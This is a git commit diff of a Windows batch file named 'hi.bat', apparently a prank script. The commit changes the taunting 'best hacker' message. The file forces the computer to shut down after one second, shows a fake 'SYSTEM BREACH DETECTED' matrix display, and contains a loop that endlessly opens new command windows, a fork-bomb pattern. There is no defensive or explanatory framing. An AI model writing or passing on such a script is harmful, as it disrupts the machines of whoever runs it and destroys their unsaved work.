725a17e4c9e5653a0c217f2653a28a3516a12f9e
IWO <saarleshembar@gmail.com>
2026-02-27 17:32:25 +0200

    hi.bat - shutdown the computer.

--- hi.bat
+++ hi.bat
@@ -1,5 +1,5 @@
 @echo off
-shutdown -c "you kicked by the best hacker, saar!" -t 1 -s
+shutdown -c "you kicked by the best hacker!" -t 1 -s
 title SYSTEM BREACH DETECTED
 color 0a
 mode 120,30
@@ -10,4 +10,5 @@ echo 0%num%1101%random%011%random%1010%random%
 goto matrix
 :loop
 start cmd
+
 goto loop
